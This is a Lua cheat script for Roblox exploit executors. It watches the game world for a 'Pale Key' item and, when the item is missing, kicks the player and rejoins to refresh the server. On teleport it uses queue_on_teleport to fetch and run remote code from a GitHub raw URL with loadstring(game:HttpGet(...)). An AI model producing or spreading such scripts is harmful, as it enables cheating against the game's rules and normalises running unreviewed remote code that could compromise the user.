local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local WorldItems = workspace:WaitForChild("WorldItems")

local Spawn = WorldItems:WaitForChild("Spawn")
local Temp = WorldItems:WaitForChild("Temp")

local StayInServer = false

local Timer = 5
local CurrentTimer = Timer
local Items = {"Pale Key",}

queueteleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) -- EXPLOIT RERUN METHOD

task.spawn(function()
	while task.wait(1) do
		if CurrentTimer <= 0 and StayInServer == false then
			if #Players:GetChildren() <= 1 then
				LocalPlayer:Kick("\nRejoining...")
				TeleportService:Teleport(game.PlaceId, LocalPlayer, nil)

			else
				LocalPlayer:Kick("Server is not refreshable.")
			end
			break
		end
		CurrentTimer -= 1
	end
end)

local function FindItems()
	for _, Item in pairs(Spawn:GetChildren()) do
		for _, DesiredItem in pairs(Items) do
			if Item.Name == DesiredItem then
				StayInServer = true
				break
			end
		end
	end
end

local function ResetTimer()
	if StayInServer == true then
		return
	end
	print("Reset timer.")
	FindItems()
	CurrentTimer = Timer
end

Temp.ChildAdded:Connect(function(NewInstance)
	if NewInstance:IsA("Configuration") and StayInServer == false then
		for _, Item in pairs(Items) do
			if NewInstance.Name == Item then
				StayInServer = true
				return
			end
		end
		ResetTimer()
	end
end)

FindItems()

LocalPlayer.OnTeleport:Connect(function()
	if queueteleport then
		queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/gangshsdft-code/FarmItemsB-L/main/FARMITEM"))()')
	end
end)
